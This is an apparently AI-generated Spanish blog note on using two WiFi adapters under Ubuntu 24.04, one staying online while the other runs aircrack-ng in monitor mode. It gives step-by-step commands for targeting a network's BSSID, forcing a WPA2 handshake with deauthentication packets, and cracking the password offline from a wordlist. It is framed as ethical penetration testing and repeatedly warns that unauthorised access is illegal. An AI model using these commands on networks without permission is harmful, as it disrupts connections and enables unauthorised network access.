---
audio: false
generated: true
image: false
lang: es
layout: post
model: x-ai/grok-4-fast
title: Adaptadores WiFi Duales para Pruebas de Seguridad
translated: true
type: note
---

Sí, Ubuntu 24.04 puede conectarse a una red WiFi usando una contraseña conocida (para acceso a internet) mientras simultáneamente intenta "hackear" (por ejemplo, crackear o probar) la contraseña de otra red WiFi, pero esto requiere hardware específico y una configuración cuidadosa para evitar conflictos. Esta configuración es común para pruebas de penetración éticas o auditorías de seguridad en tus propias redes—ten en cuenta que el acceso no autorizado es ilegal.

### Requisitos Clave
- **Dos adaptadores WiFi**: Necesitas al menos dos interfaces inalámbricas separadas (por ejemplo, la WiFi integrada del portátil como `wlan0` para la conexión, y un adaptador USB WiFi como `wlan1` para monitoreo). Un solo adaptador no puede estar conectado (modo gestionado) y en modo monitor al mismo tiempo.
  - Adaptadores recomendados para modo monitor: Intel (por ejemplo, AX200/AX210), Atheros, o chipsets Realtek compatibles. Verifica la compatibilidad con `iw list` (busca "monitor" bajo los modos de interfaz soportados).
- **Herramientas**: Instala el suite `aircrack-ng` para escanear, capturar handshakes y crackear:  
  ```
  sudo apt update && sudo apt install aircrack-ng
  ```
- **Específicos de Ubuntu 24.04**: No hay cambios importantes respecto a versiones anteriores—NetworkManager maneja las conexiones, pero las herramientas de modo monitor pueden interferir si no se gestionan correctamente. El kernel 6.8+ soporta bien los adaptadores modernos.

### Cómo Funciona: Configuración Paso a Paso
1. **Conéctate a la WiFi Conocida (Modo Gestionado)**:
   - Usa NetworkManager (GUI o CLI) para conectarte normalmente:  
     ```
     nmcli device wifi connect "TuSSIDConocido" password "contraseñaconocida"
     ```
   - Verifica: `nmcli connection show --active`. Esto mantiene tu internet activo en la primera interfaz (por ejemplo, `wlan0`).

2. **Configura el Segundo Adaptador para Monitoreo (Sin Interrumpir el Primero)**:
   - Identifica las interfaces: `iw dev` (por ejemplo, `wlan1` es tu adaptador USB).
   - Evita `airmon-ng` (de aircrack-ng), ya que a menudo termina NetworkManager e interrumpe conexiones. En su lugar, usa comandos manuales `iw`:  
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type monitor
     sudo ip link set wlan1 up
     ```
   - Verifica: `iw dev` (debería mostrar `type monitor` para `wlan1`).

3. **Escanear y Capturar para Crackear la Contraseña**:
   - Escanea redes: `sudo airodump-ng wlan1` (lista SSIDs, BSSIDs, canales; presiona Ctrl+C para detener).
   - Apunta a una red específica (por ejemplo, BSSID `AA:BB:CC:DD:EE:FF` en el canal 6):  
     ```
     sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan1
     ```
     Esto captura paquetes en `capture-01.cap`. Para crackeo WPA2, espera un handshake de 4 vías (o fuerza uno éticamente con deauth: `sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1`).
   - Crackea offline: `sudo aircrack-ng -w /ruta/a/tu/lista_de_palabras.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`.

4. **Restaurar la Operación Normal**:
   - Detén el monitoreo:  
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type managed
     sudo ip link set wlan1 up
     ```
   - Reconecta si es necesario: Reinicia NetworkManager (`sudo systemctl restart NetworkManager`) o usa `nmcli`.

### Problemas Potenciales y Soluciones
- **Caídas de Conexión**: Si la primera WiFi se desconecta (raro con el método manual), renueva DHCP: `sudo dhclient -r wlan0 && sudo dhclient wlan0`.
- **Interferencia**: Termina procesos conflictivos solo en la interfaz de monitor: `sudo airmon-ng check kill` (pero esto afecta a todos—úsalo con precaución).
- **Estabilidad del Adaptador USB**: Algunos adaptadores baratos fallan en modo monitor; prueba con `iwconfig` o `iw dev`.
- **Alternativa Cableada**: Si no tienes una segunda WiFi, usa Ethernet para internet y monitorea con el único adaptador WiFi (más fácil, ya que terminar NetworkManager no afectará la conexión cableada).

Esta configuración funciona de forma fiable en Ubuntu 24.04 para fines de prueba. Siempre obtén permiso antes de probar redes.

### Referencias
- [How to enable WiFi while using two wireless cards one in monitor mode](https://security.stackexchange.com/questions/121215/how-to-enable-wifi-while-using-two-wireless-cards-one-in-monitor-mode-and-other)  
- [Wireless Packet Capture using Ubuntu 24 LTS](https://www.reddit.com/r/RGNets/comments/1l4672v/wireless_packet_capture_using_ubuntu_24_lts/)  
- [Aircrack-ng Newbie Guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)